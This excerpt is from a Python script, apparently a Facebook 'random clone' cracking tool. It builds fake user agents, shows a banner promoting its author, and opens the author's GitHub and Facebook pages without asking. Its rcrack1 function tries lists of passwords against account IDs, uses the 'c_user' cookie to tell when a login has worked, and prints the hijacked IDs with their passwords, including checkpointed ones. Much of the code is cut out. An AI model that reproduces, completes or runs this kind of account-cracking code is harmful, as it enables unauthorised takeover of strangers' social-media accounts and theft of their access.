#Create By: FOYSAL-KHAN ISLAM HIMU
#FaceBook: FOYSAL-KHAN Islam
#GitHub: https://github.com/FOYSAL-KHAN-404-CYBER
#---------------------------------------------------------------------------#
...
for xd in range(10000):
    ...
    uaku2=(f'{a}{b}{c}{d}{e}{f}')
    ugen.append(uaku2)
os.system('xdg-open https://github.com/FOYSAL-KHAN-404-CYBER')
logo = ("""
\033[1;91m  ########::'#######::'##:::'##::'######:::::'###::::'##:::::::
\033[1;92m  ##.....::'##.... ##:. ##:'##::'##... ##:::'## ##::: ##:::::::
\033[1;93m  ##::::::: ##:::: ##::. ####::: ##:::..:::'##:. ##:: ##:::::::
...
\033[1;97m  ##:::::::. #######::::: ##::::. ######:: ##:::: ##: ########:     \033[1;92m
 ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
 ┃ [✓] AUTHOR    \033[1;91m: \033[1;92mFOYSAL-KHAN                              ┃
 ┃ [✓] TOOL      \033[1;91m: \033[1;92mRANDOM CLONE                              ┃
 ┃ [✓] STATUS    \033[1;91m: \033[1;92mFREE                       ┃
 ┃ [✓] SYSTEM    \033[1;91m: \033[1;92mDATA & WIFI                ┃
 ┃ [✓] GITHUB    \033[1;91m: \033[1;92mFOYSAL-KHAN-404-CYBER            ┃
 ┃ [✓] FACEBOOK  \033[1;91m: \033[1;92mFOYSAL-KHAN Islam                ┃
...
class Main:
    def __init__(self):
        ...
        print(" [00] Exit")
        print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        FOYSAL-KHAN =input(" [?] Choose : ")
        os.system('xdg-open https://www.facebook.com/profile.php?id=100071152006422')
        if FOYSAL-KHAN in ["1", "01"]:
            num()
        if FOYSAL-KHAN in ["2","02"]:
            gml()
        if FOYSAL-KHAN in [" 0", "00"]:
            exit()
        else:
            exit()
def num():
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r[\033[1;92mKHAN\033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[KHAN-CP] {cid} | {ps}")
